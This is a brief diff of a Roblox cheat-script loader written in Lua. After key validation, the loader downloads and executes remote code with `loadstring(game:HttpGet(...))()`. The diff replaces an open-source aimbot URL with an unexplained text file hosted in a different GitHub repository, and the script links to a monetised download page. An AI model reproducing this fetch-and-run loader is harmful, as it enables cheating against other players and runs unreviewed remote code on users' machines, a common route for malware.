@@ -432,7 +432,7 @@ function Task()
 						end
 						-- Load the aimbot after successful key validation
 						task.wait(0.5)
-						loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua"))()
+						loadstring(game:HttpGet("https://raw.githubusercontent.com/ftcontop/rivals/refs/heads/main/message%20(2).txt"))()
 					end)
 				end)
 
@@ -466,3 +466,4 @@ local Window = Task:Window({
 	MinIcon = "rbxassetid://102391696721436",
 	Workink = "https://work.ink/21KD/free-script-ftchub",
 })
+
